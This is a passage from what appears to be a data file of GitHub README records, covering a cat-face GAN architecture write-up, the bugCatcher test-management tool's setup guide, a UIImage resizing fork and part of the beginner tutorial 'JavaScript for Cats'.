and can accumulate over time.\nV\nV (the Validator) is intended to be a half-decent replacement of validation scores, which you don't have in GANs. V's architecture is - similarly to D - a convolutional neural network.\nJust like D, V creates fake/real judgements for images, i. e. it rates how fake images look. V gets fed images generated by G and rates them. The mean of that rating can be used\nas the mentioned validation score replacement.\nV is trained once before the generator network. During its training, V sees real images from the dataset as well as synthetically generated fake images. The methods to generate the synthetic\nimages are roughly:\n\nRandom mixing of two images.\nRandom warping of an image (i. e. move parts of the image around, causing distortions).\nRandom stamping of an image (i. e. replace parts of the image by parts from somewhere else in the image).\nRandomly throw random pixel values together (with some gaussian blurring technique, so that its not just gaussian noise).\n\nThese techniques are then sometimes combined with each other, e. g. one image is modified by warping, another by stamping and then both are mixed into one final synthetic image.\nV seems to be capable of often spotting really bad images. It is however rather bad at distinguishing the quality of good images.\nSo long as the image looks roughly like a cat, V will tend to produce a good rating. The images start to look good after epoch 50 or so, which is when V's rating isn't helpful anymore.\nArchitectures\nAll networks are optimized for 32x32 images. They should work with 16x16 images too. Anything else will likely result in errors.\nMost of the activations were PReLUs, because they perform better than ReLUs in my experience.\nNetworks with LeakyReLUs seemed to blow up more frequently, so I didn't use them very much.\nG\nThe architecture of G (version G32up-c) is mostly copied from the blog post by Anders Boesen Lindbo Larsen and S\u00f8ren Kaae S\u00f8nderby.\nIt is basically a full laplacian pyramid in one network.\nThe network starts with a small linear layer, which roughly generates 4x4 images.\nThat is followed by upsampling layers, which increase the image size to 8x8 then 16x16 and then 32x32 pixels.\nlocal model = nn.Sequential()\n-- 4x4\nmodel:add(nn.Linear(noiseDim, 512*4*4))\nmodel:add(nn.PReLU(nil, nil, true))\nmodel:add(nn.View(512, 4, 4))\n\n-- 4x4 -> 8x8\nmodel:add(nn.SpatialUpSamplingNearest(2))\nmodel:add(cudnn.SpatialConvolution(512, 512, 3, 3, 1, 1, (3-1)/2, (3-1)/2))\nmodel:add(nn.SpatialBatchNormalization(512))\nmodel:add(nn.PReLU(nil, nil, true))\n\n-- 8x8 -> 16x16\nmodel:add(nn.SpatialUpSamplingNearest(2))\nmodel:add(cudnn.SpatialConvolution(512, 256, 3, 3, 1, 1, (3-1)/2, (3-1)/2))\nmodel:add(nn.SpatialBatchNormalization(256))\nmodel:add(nn.PReLU(nil, nil, true))\n\n-- 16x16 -> 32x32\nmodel:add(nn.SpatialUpSamplingNearest(2))\nmodel:add(cudnn.SpatialConvolution(256, 128, 5, 5, 1, 1, (5-1)/2, (5-1)/2))\nmodel:add(nn.SpatialBatchNormalization(128))\nmodel:add(nn.PReLU(nil, nil, true))\n\nmodel:add(cudnn.SpatialConvolution(128, dimensions[1], 3, 3, 1, 1, (3-1)/2, (3-1)/2))\nmodel:add(nn.Sigmoid())\nwhere dimensions[1] is 3 for color and 1 for grayscale mode. noiseDim is a vector of size 100 with values sampled from a uniform distribution between -1 and +1.\nA different version of G is G32up, which is shown in some of the images at the top.\nIt is mostly identical to G32up-c, just a bit smaller:\nlocal model = nn.Sequential()\nmodel:add(nn.Linear(noiseDim, 128*8*8))\nmodel:add(nn.View(128, 8, 8))\nmodel:add(nn.PReLU(nil, nil, true))\n\nmodel:add(nn.SpatialUpSamplingNearest(2))\nmodel:add(cudnn.SpatialConvolution(128, 256, 5, 5, 1, 1, (5-1)/2, (5-1)/2))\nmodel:add(nn.SpatialBatchNormalization(256))\nmodel:add(nn.PReLU(nil, nil, true))\n\nmodel:add(nn.SpatialUpSamplingNearest(2))\nmodel:add(cudnn.SpatialConvolution(256, 128, 5, 5, 1, 1, (5-1)/2, (5-1)/2))\nmodel:add(nn.SpatialBatchNormalization(128))\nmodel:add(nn.PReLU(nil, nil, true))\n\nmodel:add(cudnn.SpatialConvolution(128, dimensions[1], 3, 3, 1, 1, (3-1)/2, (3-1)/2))\nmodel:add(nn.Sigmoid())\nD\nD is a convolutional network with multiple branches.\nIt uses a spatial transformer at the start to remove rotations.\nThree of the four branches also have spatial transformers (for rotation, translation and scaling).\nAs such they can learn to focus on specific areas of the image. (I don't know if they really did learn that.)\nThe fourth branch is intended to analyze the whole image.\nI reused this architecture from a previous project where it seemed to improve performance slightly.\nI did not test a \"normal\" convnet architecture for this project, though such a structure performed well when I used it to generate skies, so it might work here too.\n\nAll convolutions were size-preserving. All localization networks of the spatial transformers used the same architecture.\nThe last hidden layer ended up a bit small to counteract the large concat. Might be worthwhile to test an architecture with a pooling layer in front of it and then 1024 neurons.\nV\nThe validator is a standard convolutional network.\nlocal model = nn.Sequential()\nlocal activation = nn.LeakyReLU\n\nmodel:add(nn.SpatialConvolution(dimensions[1], 128, 3, 3, 1, 1, (3-1)/2))\nmodel:add(activation())\nmodel:add(nn.SpatialMaxPooling(2, 2))\nmodel:add(nn.SpatialConvolution(128, 128, 3, 3, 1, 1, (3-1)/2))\nmodel:add(nn.SpatialBatchNormalization(128))\nmodel:add(activation())\nmodel:add(nn.SpatialMaxPooling(2, 2))\nmodel:add(nn.Dropout())\n\nmodel:add(nn.SpatialConvolution(128, 256, 3, 3, 1, 1, (3-1)/2))\nmodel:add(activation())\nmodel:add(nn.SpatialConvolution(256, 256, 3, 3, 1, 1, (3-1)/2))\nmodel:add(nn.SpatialBatchNormalization(256))\nmodel:add(activation())\nmodel:add(nn.SpatialMaxPooling(2, 2))\nmodel:add(nn.SpatialDropout())\nlocal imgSize = 0.25 * 0.25 * 0.25 * dimensions[2] * dimensions[3]\nmodel:add(nn.View(256 * imgSize))\n\nmodel:add(nn.Linear(256 * imgSize, 1024))\nmodel:add(nn.BatchNormalization(1024))\nmodel:add(activation())\nmodel:add(nn.Dropout())\n\nmodel:add(nn.Linear(1024, 1024))\nmodel:add(nn.BatchNormalization(1024))\nmodel:add(activation())\nmodel:add(nn.Dropout())\n\nmodel:add(nn.Linear(1024, 2))\nmodel:add(nn.SoftMax())\nwhere dimensions[1] is 3 (color) or 1 (grayscale). dimensions[2] and dimensions[3] are both 32.\n(A 1-neuron sigmoid output would have probably been more logical.)\nDataset preprocessing\nAs a preprocessing step, all faces must be extracted from the 10k cats dataset.\nThe dataset contains facial keypoints for each image (ears, eyes, nose), so extracting the faces isn't too hard.\nEach of the faces gets rotated so that the eyeline is parallel to the x axis (i.e. rotations are removed).\nThat was necessary as many cat images tend to be heavily rotated, making the learning task significantly harder (though that might work now with the addition of Spatial Transformers in D).\nAfter that normalization step, the images are augmented by introducing (now small) rotations, translations, scalings, brightness changes, by flipping them horizontally and by adding minor gaussian noise.\nThe data set size is increased by that to roughly 100k images (however these images are often only marginally different, so it's not 100k images worth of information).\nOther\n\nAdam was used as the optimizer.\nBatch size was 32, i.e. D would get 16 fake and 16 real images, while G would get 32 attempts to mess with D."}, {"title": "youzan/bugCatcher", "language": "Java", "content": "\u6349\u866b\u8bb0\n\u3010\u62db\u8058\u3011Java\u5f00\u53d1\u3001\u6d4b\u8bd5\u5f00\u53d1\u7b49\u5c97\u4f4d\uff0c\u6709\u610f\u8005\u8bf7\u5c06\u7b80\u5386\u6295\u9012\u81f3<canyuns\u3010@\u3011163.com>\n\n\u6349\u866b\u8bb0\u7279\u6027\n\u6349\u866b\u8bb0 \u8bbe\u8ba1\u521d\u8877\u662f\u4e3a\u4e86\u65b9\u4fbf\u5f00\u53d1\u4eba\u5458\u81ea\u6d4b\uff08\u5f53\u7136\u4e86\uff0c\u5bf9\u4e8e\u9700\u8981\u81ea\u884c\u5b8c\u6210\u6d4b\u8bd5\u7684\u6d4b\u8bd5\u56e2\u961f\u4e5f\u662f\u9002\u7528\u7684\uff09\uff0c\u5176\u4e3b\u8981\u7279\u6027\u4e3a\uff1a\n\n\u9879\u76ee\u7ba1\u7406 \uff1a\u7531\u9700\u6c42\u65b9\u53d1\u8d77\u9879\u76ee\uff0c\u5e76\u6309\u7167\u7011\u5e03\u6d41\u8f6f\u4ef6\u5f00\u53d1\u6a21\u578b\u8ddf\u8e2a\u6574\u4e2a\u9879\u76ee\u7684\u5b8c\u6210\u60c5\u51b5\uff1b\n\u7528\u4f8b\u7ba1\u7406 \uff1a\u65b9\u4fbf\u6dfb\u52a0\u548c\u7ba1\u7406\u6d4b\u8bd5\u7528\u4f8b\uff0c\u4e5f\u652f\u6301Excel\u3001Xmind\u7b49\u6587\u4ef6\u5f62\u5f0f\u7684\u7528\u4f8b\u4e0a\u4f20\uff0c\u652f\u6301\u7528\u4f8b\u7b5b\u9009\uff0c\u5e76\u4e3a\u9879\u76ee\u5206\u914d\u9700\u8981\u6267\u884c\u7684\u7528\u4f8b\uff1b\n\u9879\u76ee\u8d28\u91cf\u62a5\u8868 \uff1a\u62a5\u8868\u4ee5\u65f6\u95f4\u7ebf\u7684\u65b9\u5f0f\u5c55\u793a\u5404\u4e2a\u9879\u76ee\u7684\u8d28\u91cf\u53d8\u5316\uff1b\n\u81ea\u6d4b\u8d28\u91cf\u6392\u540d \uff1a\u4ee5\u79ef\u5206\u6392\u540d\u7684\u65b9\u5f0f\u5c55\u793a\u9879\u76ee\u6210\u5458\u81ea\u6d4b\u8d28\u91cf\u9ad8\u4f4e\uff1b\n\u7cbe\u7ec6\u5316\u7684\u6743\u9650\u63a7\u5236 \uff1a\u7cbe\u7ec6\u7684\u89d2\u8272\u5206\u79bb\uff08\u4ea7\u54c1\u3001\u5f00\u53d1\u3001\u6d4b\u8bd5\uff09\uff0c\u63d0\u4f9b\u7cbe\u7ec6\u5316\u7684\u6743\u9650\u63a7\u5236\uff0c\u67d0\u89d2\u8272\u53ef\u4ee5\u505a\u4ec0\u4e48\uff0c\u4e0d\u53ef\u4ee5\u505a\u4ec0\u4e48\u4e00\u76ee\u4e86\u7136\uff1b\n\n\u5178\u578b\u4f7f\u7528\u573a\u666f\n\n\n**\u63d0\u793a\uff1a**\u5177\u4f53\u53ef\u53c2\u8003\u4e0b\u9762\u5178\u578b\u573a\u666f\u4f7f\u7528\u56fe\u793a\u4e00\u8282\uff0c\u4f46\u662f\u4ec0\u4e48\u89d2\u8272\u505a\u4ec0\u4e48\u4e0d\u662f\u7edd\u5bf9\u7684\uff0c\u53ef\u4ee5\u6839\u636e\u56e2\u961f\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\uff0c\u6bd4\u5982\uff0c\u53ef\u4ee5\u7531\u6d4b\u8bd5\u4eba\u5458\u53d1\u8d77\u9879\u76ee\u3002\n\n\u4f7f\u7528\u65b9\u6cd5\n\u73af\u5883\u4f9d\u8d56\n\n**\u7cfb\u7edf\uff1a**Linux\n**\u8bed\u8a00\uff1a**Java \uff08Version>1.8\uff09\n**\u6570\u636e\u5e93\uff1a**Mysql\n**\u5176\u4ed6\u5de5\u5177\uff1a**Maven\n\n\u521d\u59cb\u5316\n\n\u4fee\u6539pfcase-schema.sql\u4e2d\u7684admin\u8d26\u53f7\u7684\u5bc6\u7801\u548cE-mail\u5730\u5740\uff08bugCatcher/src/main/resources/database/pfcase-schema.sql\uff09\n\nINSERT INTO signon VALUES('admin','Your Password');\nINSERT INTO account VALUES('admin','Your E-mail address','admin');\n\n\u4fee\u6539jdbc.properties\u4e2d\u7684mysql\u914d\u7f6e\uff08bugCatcher/src/main/resources/orm/jdbc.properties\uff09\n\n# local\njdbc.driverClassName=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://<mysql host>:<mysql \u7aef\u53e3>/pfcase\njdbc.username=<mysql \u7528\u6237\u540d>\njdbc.password=<mysql \u5bc6\u7801>\n\n\n\u4fee\u6539setup.sh\u4e2d\u7684mysql\u914d\u7f6e\uff08bugCatcher/setup.sh\uff09\n\n#!/usr/bin/env bash\n\nmkdir ~/fileupload\nmysql -h <mysql host> -P <mysql \u7aef\u53e3> -u <mysql \u7528\u6237\u540d> -p<mysql \u5bc6\u7801> < <\u4e0a\u8ff0pfcase-schema.sql\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84>\n\u6267\u884csetup.sh\u5b8c\u6210\u521d\u59cb\u5316\n\u542f\u52a8\nmvn tomcat7:run -Dmaven.tomcat.port=<\u7aef\u53e3\u53f7> &\n\n\u63d0\u793a\uff1a<\u7aef\u53e3\u53f7>\u8bbe\u7f6e\u4e3a\u4efb\u610f\u672a\u88ab\u5360\u7528\u7684\u7aef\u53e3\u5373\u53ef\n\n\u4ee5\u90e8\u7f72\u5728\u672c\u673a8080\u7aef\u53e3\u4e3a\u4f8b\uff0c\u6253\u5f00 http://localhost:8080/ \u5373\u80fd\u6253\u5f00\u6349\u866b\u8bb0\u767b\u5f55\u9875\u9762\n\n\u5178\u578b\u573a\u666f\u4f7f\u7528\u56fe\u793a\n\u65b0\u7528\u6237\u6ce8\u518c\n\n\u89d2\u8272-\u529f\u80fd\u5bf9\u7167\u8868\n\n\n\n\u89d2\u8272/\u529f\u80fd\n\u6211\u7684\u4efb\u52a1\n\u6267\u884c\u7528\u4f8b\n\u6267\u884c\u8bc4\u4ef7\n\u65b0\u5efa\u4efb\u52a1\n\u65b0\u5efa\u7528\u4f8b\n\u67e5\u770b\u7528\u4f8b\n\u5206\u914d\u7528\u4f8b\n\u4e0a\u4f20\u7528\u4f8b\n\u6267\u884c\u8d28\u91cf\n\u534e\u5c71\u8bba\u5251\n\n\n\n\n\u6d4b\u8bd5\n\u5c55\u793a\u6240\u6709\u4eba\u7684\u4efb\u52a1\n\u2014\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\n\n\u5f00\u53d1\n\u53ea\u5c55\u793a\u81ea\u5df1\u7684\u4efb\u52a1\n\u25cb\n\u2014\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u2014\n\n\n\u4ea7\u54c1\n\u53ea\u5c55\u793a\u81ea\u5df1\u7684\u4efb\u52a1\n\u2014\n\u2014\n\u25cb\n\u25cb\n\u25cb\n\u2014\n\u25cb\n\u25cb\n\u2014\n\n\nadmin\n\u5c55\u793a\u6240\u6709\u4eba\u7684\u4efb\u52a1\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\u25cb\n\n\n\n\n**admin\uff1a**\u5185\u7f6e\u8d26\u6237\uff0c\u62e5\u6709\u6700\u9ad8\u6743\u9650\uff0c\u53ef\u4ee5\u505a\u4efb\u4f55\u64cd\u4f5c\uff0c\u614e\u7528\u3002\n\n\u4ea7\u54c1\u53d1\u8d77\u9879\u76ee\uff0c\u6307\u5b9a\u9879\u76ee\u5f00\u53d1\u4eba\u5458:\n\n\u6d4b\u8bd5\u8bbe\u8ba1\u7528\u4f8b\uff0c\u5c06\u76f8\u5173\u7528\u4f8b\u5206\u914d\u7ed9\u8be5\u9879\u76ee\u7684\u5f00\u53d1\u4eba\u5458:\n\u65b0\u5efa\u7528\u4f8b\uff0c\u6a21\u5757\u652f\u6301\u65b0\u5efa\u6216\u8005\u9009\u62e9\u5df2\u6709\u7684:\n\n\u9009\u62e9\u9879\u76ee\uff0c\u52fe\u9009\u8be5\u9879\u76ee\u9700\u8981\u6267\u884c\u7684\u7528\u4f8b\u5e76\u5206\u914d\uff08\u7528\u4f8b\u652f\u6301\u6309\u6307\u5b9a\u6761\u4ef6\u641c\u7d22/\u7b5b\u9009\uff09:\n\n\u6349\u866b\u8bb0\u4e5f\u652f\u6301Excel\u3001Xmind\u7b49\u6587\u4ef6\u5f62\u5f0f\u7684\u7528\u4f8b\u4e0a\u4f20\uff0c\u4f46\u4ec5\u505a\u5907\u4efd\u7528\u4f8b\u4f7f\u7528\uff1a\n\n\u5f00\u53d1\u4eba\u5458\u6267\u884c\u7528\u4f8b\n\u6267\u884c\u4e00\u6761\uff0c\u5df2\u6267\u884c\u680f\u76ee\u4e0b\u52fe\u9009\u4e00\u6761\uff1a\n\n\u6d4b\u8bd5\u68c0\u67e5\u5f00\u53d1\u4eba\u5458\u7528\u4f8b\u6267\u884c\u60c5\u51b5\u5e76\u7ed9\u51fa\u8bc4\u4ef7\n\u6d4b\u8bd5\u4eba\u5458\u4e00\u6761\u6761\u68c0\u67e5\u4e0b\u53bb\uff0c\u529f\u80fd\u65e0\u8bef\u70b9\u51fbgood\u6309\u94ae\uff0c\u6267\u884c\u4e0d\u5230\u4f4d\u70b9\u51fbbad\u6309\u94ae\uff08\u53ef\u4ee5\u5c06bug\u94fe\u63a5\u586b\u5199\u4e0a\u53bb\uff09\uff0c\u5f53\u9879\u76ee\u4e0b\u7684\u7528\u4f8b\u5168\u90e8\u6267\u884c\u5b8c\u6210\u4ee5\u540e\u4f1a\u5728\u9879\u76ee\u6982\u51b5\u4e0b\u81ea\u52a8\u6253\u5206\n\n\u9879\u76ee\u81ea\u6d4b\u8d28\u91cf\u7684\u6253\u5206\u4f1a\u4ee5\u56fe\u8868\u7684\u5f62\u5f0f\u5c55\u73b0\n\n\u534e\u5c71\u8bba\u5251\n\u6b64\u680f\u76ee\u4e3b\u8981\u5bf9\u6267\u884c\u7528\u4f8b\u7684\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u81ea\u6d4b\u8d28\u91cf\u8bc4\u4ef7\uff0c\u8bc4\u5206\u6709A\uff08+20\uff09/ B\uff08+10\uff09/ C\uff08-10\uff09\u4e09\u4e2a\u7b49\u7ea7\uff0c\u5177\u4f53\u8bc4\u4ef7\u6807\u51c6\u53ef\u4ee5\u81ea\u884c\u5b9a\u4e49\uff0c\u6700\u7ec8\u4f1a\u7ed9\u6240\u6709\u4eba\u5458\u4e00\u4e2a\u79ef\u5206\u6392\u540d\n\nTodo List\n\nbug\u7ba1\u7406\u4e0e\u8ddf\u8e2a\n\n\u53cd\u9988\u4e0e\u5efa\u8bae\n\n\u8bf7\u5728Issues\u4e2d\u8ba8\u8bba\n\nLicense\nThe project is open-sourced software licensed under the MIT license"}, {"title": "mbcharbonneau/UIImage-Categories", "language": "Objective-C", "content": "UIImage Categories\nAbout\nUIImage Categories is a fork of Trevor Harmon's category methods for cropping and resizing UIImage objects in iOS. Read more on his 2009 blog post on the subject:\n\nDespite its ease of use, or perhaps because of it, UIImage suffers from some serious limitations. Key among these is its lack of support for resizing the image, a feature that is normally handled dynamically by its companion, the UIImageView component. However, should an iPhone application need to reduce the size of an image for storage or for exchange with an external entity (such as a web server), the UIImage class is insufficient.\n\nThis fork includes several fixes for compiler warnings and drawing bugs which have surfaced in newer versions of the iOS SDK.\nContributing\nPRs are welcome, but please include some test images to demonstrate what's being fixed. That way I can test against  regressions when merging future changes!"}, {"title": "maxogden/javascript-for-cats", "language": "JavaScript", "content": "JavaScript For Cats\nAn introduction for new programmers \nSo easy your human companion could do it too!\nJavaScript is a programming language or, in other words, a means by which a computer is instructed to do things. Just the same as one controls humans with hisses and meows, one controls computers with statements written in a programming language. All web browsers understand JavaScript and you can take advantage of that to make web pages do crazy things!\nJavaScript started as a way to make web pages more interactive. Nowadays JavaScript runs in more places than just web browsers \u2014 it runs on web servers, phones and even robots! This page will teach you some JavaScript basics so that you can get up and running in no time*.\n* Actual time: more than none. Probably an hour or two. Also since you are a cat you are less likely to run and more likely to lay around in the sun\nJavaScript for Cats is CC0 Licensed\nTable of contents\n\nThe console\nStrings\nValues and variables\nUsing functions\nBuilt in JS functions\nDownload new JS functions\nWriting new functions\nLoops\nArrays\nObjects\nCallbacks\nRecommended reading\n\nDon't be a scaredy-cat\n\nYou will always land on your feet \u2014 even when programming! Unlike pawing over a glass of water on your laptop, nothing in these tutorials will damage your computer in any way, even if you mistype a command or click the wrong button. Like cats, computer programmers make mistakes all time: misspelling things, forgetting quotes or brackets, and being forgetful of how basic functions (and yarn, lasers) work. Programmers care more about making it work eventually rather than trying to make it work the very first time. The best way to learn is by making mistakes!\nSo don't be a scaredy-cat! The absolute worst thing that will happen is that you might have to refresh this page in your web browser if you get stuck. Don't worry though, this will happen very rarely.\n# The basics\nThere is JavaScript running on this page right now.  Let's play around with it a little. For the sake of simplicity I'll assume you are using Google Chrome to read this page (if you aren't it's probably easier on both of us if you follow along with Chrome).\nFirst, right click anywhere on the screen and hit Inspect Element, then click on the Console tab. You should see a thingy that looks like this:\n\nThis is a console, otherwise known as a \"command line\" or \"terminal\". Basically it's a way to type one thing at a time into a computer and immediately get the computers answer back. They are super useful as a learning tool (I still use the console nearly every day that I'm coding).\nThe console does some pretty cool stuff. Here I have started to type something and the console is helping me out by giving me a list of all the possible things I could continue to type! Another thing you could do is type 1 + 1 into the console and then hit the Enter key and watch what happens.\nUsing the console is a very important part of learning JavaScript. If you don't know if something works or what the command is for something, go to the console and figure it out! Here's an example:\n# Strings\nSince I am a cat I want to replace every instance of the word dog on the Internet with those blasted dogs. First go into your console and type in a few sentences that contain the word dog at least once. In JavaScript a bunch of letters, numbers, words or anything else is known as a String (as in a string of characters). Strings have to begin AND end with a quotation mark. Single ' or double \" is fine, just make sure you use the same at the beginning as you do at the end.\n\nSee the nasty error message? Don't worry - you didn't break any laws. SyntaxError ILLEGAL is just the way it sounds when robots tell you that your program has a problem. The first two sentences had matching quotation marks at the beginning and end, but when I mixed single and double quotation marks it freaked out on me.\nOK, to fix up one of these sentences (by replacing dog with our enhanced version) we have to first save the original sentence so that we can call it up later when we do our replacing magic. Notice how the string gets repeated in red when we type it into the console? This is because we haven't told it to save the sentence anywhere so it just gives it right back (or it gives us an Error back if we messed something up).\n# Values and variables\nValues are the simplest components in JavaScript. 1 is a value, true is a value, \"hello\" is a value, function() {} is a value, the list goes on! There are a handful of different types of values in JavaScript but we don't need to go over them all right away \u2014 you will learn them naturally the more you code!\nTo store values we use things called variables. The word 'variable' means 'can change' and is used because variables can store many different types of values and can change their value many times. They are pretty much like mailboxes. We put something in a variable, like our sentence, and then give the variable an address that we can use to look up the sentence later. In real life mailboxes have to have PO Box numbers but in JavaScript you usually just use lowercase letters or numbers without any spaces.\n\nvar is shorthand for variable and the = means store the thing on the right-hand side in the thing on the left-hand side. Also as you can see, now that we are storing our sentence in a variable the console doesn't just return our sentence right away, but instead gives us undefined which means there was nothing to return.\nIf you simply type a variable name into the console it will print out the value stored in that variable. A note about variables is that by default they go away when you switch to a different page. If I were to hit the Refresh button in Chrome, for example, my dogSentence variable would get wiped and it would be like it never existed. But don't worry about this too much for now \u2014 you can just hit the up or down arrows on your keyboard while in the console to go through everything you've entered in recently.\n# Functions\nNow that we have our sentence stored in a variable, let's change a word stored in it!  We can do this by performing a function.  Functions are a type of value that, well, serve a specific function (AKA purpose or action) for us. Calling them \"actions\" sounded weird I guess so they went with the word \"function\" instead.\nJavaScript has a function called replace that does exactly what we want! Functions take in any number of values in their parentheses (zero, one or many) and return either nothing (undefined) or the changed string. The replace function is available to use on any strings and takes in two values: the characters to take out and the characters to swap in. It gets confusing to describe these things so here is a visual example:\n\nNotice how the value of dogSentence is the same even after we run replace on it? This is because the replace function, (and most JavaScript functions for that matter) takes the value we give it and returns a new value, without modifying the value we passed in. Since we didn't store the result (there is no = on the left side of the replace function) it just printed out the return value in our console.\n# The \"standard library\"\nYou might be wondering what other functions are available in JavaScript. The answer: A TON. There are lots built in, standard libraries that you can learn about at MDN (A site run by Mozilla that has lotsa nifty information about web technologies). For example here is the MDN page on JavaScript's Math object.\n# Third-party JavaScript\nThere is also a lot of JavaScript code available that is not built in. JavaScript from third parties is usually referred to as a \"library\" or \"plugin\". One of my favorites is called Underscore.js. Let's go and grab it and load it into our page! First go to the Underscore site, http://underscorejs.org/, click on the download link (I usually use development versions because they are easier to read but both will give you the same basic functionality), and then copy all the code onto your clipboard (you can use Select All from the Edit menu to select everything). Then paste it into your console and hit enter. Now your browser has a new variable in it: _. Underscore gives you a ton of helpful functions to play with. We'll learn more about how to use them later.\n\n# Making new functions\nYou aren't limited to using other peoples functions \u2014 you can also write them yourself. It's pretty easy! Let's make a function called makeMoreExciting that adds a bunch of exclamation points to the end of a string.\nfunction makeMoreExciting(string) {\n  return string + '!!!!'\n}\n\nIn my head I read it out loud like this: \"there's a function called 'make more exciting' that takes in a string and returns a new copy of that string that has a bunch of exclamation points at the end\". Here is how we would write this in the console manually if we weren't using a function:\n\nThe expression string + '!!!!' returns a new string and our variable called string stays the same as before (since we never updated it to anything else with =).\nLet's use our function instead of doing it manually. First, paste the function into the console and then call the function by passing in a string:\n\nYou could also call the same function by passing in a variable that points to a string (in the above example we just typed the string straight in there as a value instead of saving it to a variable first):\n\nThe line makeMoreExciting(sentence) is equivalent to saying sentence + '!!!!'. What if we wanted to modify in-place (aka update) the value of sentence? Simply save the return value of the function back into our sentence variable:\nvar sentence = \"time for a nap\"\nsentence = makeMoreExciting(sentence)\n\nNow sentence will have the exclamation marks in it! Note that you only have to use var when you are initializing a variable \u2014 the first time you ever use it. After that you shouldn't use var unless you want to re-initialize (reset/clear/empty) the variable.\nWhat would happen if we took out the return statement in our function?\n\nWhy is sentence empty? Because functions return undefined by default! You can choose to return a value by returning something. Functions should take in a value and, if they change the value or create a new value that is supposed to be used later, return a value (fun fact: a fancy term for this style is functional programming). Here is another function that doesn't return anything but instead uses a different method to show us the output:\nfunction yellIt(string) {\n  string = string.toUpperCase()\n  string = makeMoreExciting(string)\n  console.log(string)\n}\nThis function, yellIt, uses our previous function makeMoreExciting as well as the built-in String method toUpperCase. Methods are just a name for a function when it belongs to something \u2014 in this case toUpperCase is a function that belongs to String so we can refer to it as either a method or a function. makeMoreExciting on the other hand doesn't belong to anyone so it would be technically incorrect to refer to it as a method (confusing, I know).\nThe last line of the function is another built-in that simply takes in any values that you give it and prints them out into the console.\n\nSo is there something wrong with the above yellIt function? It depends! Here are the two major types of functions:\n\nfunctions that modify or create values and return them\nfunctions take in values and perform some action that cannot be returned\n\nconsole.log is an example of the second type of function: it prints things out to your console \u2014 an action that you can see with your eyes but that cannot be represented as a JavaScript value. My own rule of thumb is to try to keep the two types of functions separate from each other, so here's how I would rewrite the yellIt function:\nfunction yellIt(string) {\n  string = string.toUpperCase()\n  return makeMoreExciting(string)\n}\n\nconsole.log(yellIt(\"i fear no human\"))\nThis way yellIt becomes more generic, meaning it only does one or two simple little things and doesn't know anything about printing itself to a console \u2014 that part can always be programmed later, outside the function definition.\n# Loops\nNow that we have some basic skills under our belt (Author's note: do cats even wear belts?) we can start being lazy. What?! Yes, that's right: programming is about being lazy. Larry Wall, inventor of the Perl programming language, called laziness the most important virtue of a good programmer. If computers didn't exist you would have to do all sorts of tedious tasks by hand, but if you learn to program you can lay in the sun all day while a computer somewhere runs your programs for you. It is a glorious lifestyle filled with relaxation!\nLoops are one of the most important ways to harness the power of a computer. Remember Underscore.js from earlier? Make sure you have it loaded in the page (remember: you can just hit the up arrow on your keyboard a few times and then hit Enter to load it in again if you need to) and try copy/pasting this into your console:\nfunction logANumber(someNumber) {\n  console.log(someNumber)\n}\n_.times(10, logANumber)\nThis code uses the times method of Underscore which takes in 1 number and 1 function and then starts from 0 and for 10 steps counts up by 1, calling the function with the number each step of the way.\n\nIf we were to manually write out what times is doing in the above code it would look like this:\nlogANumber(0)\nlogANumber(1)\nlogANumber(2)\nlogANumber(3)\nlogANumber(4)\nlogANumber(5)\nlogANumber(6)\nlogANumber(7)\nlogANumber(8)\nlogANumber(9)\nBut cats refuse to do unnecessary manual work like this so we must always ask ourselves, \"am I doing this in the laziest way possible?\".\nSo why is this called looping? Think of it like this: If we were to write out a list of 10 numbers (from 0 to 9) using a JavaScript Array it would look like this:\nvar zeroThroughTen = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nWhat times really does is visit each number and repeat a task: in the example above the task was to call the logANumber function with the current number. Repeating tasks in this way is referred to as looping over the Array.\n# Arrays\nI've mentioned these a few times but let's spend a minute learning about them. Imagine you need to keep track of all your buddies. Well, an Array will do just fine. Think of an Array like a sorted list that you can keep tons of stuff in.\nThis is how you make one:\nvar myCatFriends = [\"bill\", \"tabby\", \"ceiling\"]\nSweet! Now you have a list of your cat buddies.\nElements (that is what you call a single item in an array) that are stored within arrays start at 0 and count up from there. So myCatFriends[0] returns bill and myCatFriends[1] returns tabby... etc etc.\nTo get buddies out of your brand new Array you can just access an element directly like so:\nconsole.log(myCatFriends[0])\n\nIf you made a brand new cat friend at the hippest cat club the other night and you want to add them to your list it is super simple: myCatFriends.push(\"super hip cat\").\nTo check that the new cat made it into your array you can use .length:\n\nNotice how push returned the length? Handy! Also take note that arrays will always preserve ordering which means they will remember the order in which you added or defined things. Not everything in JavaScript preserves ordering so remember this special property of Arrays!\n# Objects\nArrays are good for lists, but for other tasks they can be hard to work with. Consider our array of cat friends. What if you also wanted to store more than just names?\nvar myCatFriends = [\"bill\", \"tabby\", \"ceiling\"]\nvar lastNames = [\"the cat\", \"cat\", \"cat\"]\nvar addresses = [\"The Alley\", \"Grandmas House\", \"Attic\"]\nSometimes it is nice to have all of the addresses or names in one variable. But sometimes you have a cat in mind, let's say Bill, and you just want to look up that cat's address. With arrays it takes a lot of work because you can't just say 'hey array, give me Bill's address' because 'Bill' is in one array and his address is in a totally different array.\n\nThis can be brittle because if our arrays change and we add a new cat to the beginning we would have to also update our billsPosition variable to point to the new location of Bill's information in the arrays! Here is a easier to maintain way to store information like this using objects:\nvar firstCat = { name: \"bill\", lastName: \"the cat\", address: \"The Alley\" }\nvar secondCat = { name: \"tabby\", lastName: \"cat\", address: \"Grandmas House\" }\nvar thirdCat = { name: \"ceiling\", lastName: \"cat\", address: \"Attic\" }\nWhy would we do it this way? Because now we have a variable for each cat that we can use to get that cats values in a more convenient and readable way.\n\nYou can think of Objects like keys on a keyring. Each one is for a specific door and if you have nice labels on your keys you can open doors very fast. In fact, the things on the left hand side of the : are called keys (are also known as properties) and the things on the right hand side are values.\n// an object with a single key 'name' and single value 'bill'\n{ name: 'bill' }\nSo why would you ever use arrays if you can just put your data in objects? Because objects don't remember the order of the keys that you set. You might enter in an object like this:\n{ date: \"10/20/2012\", diary: \"slept a 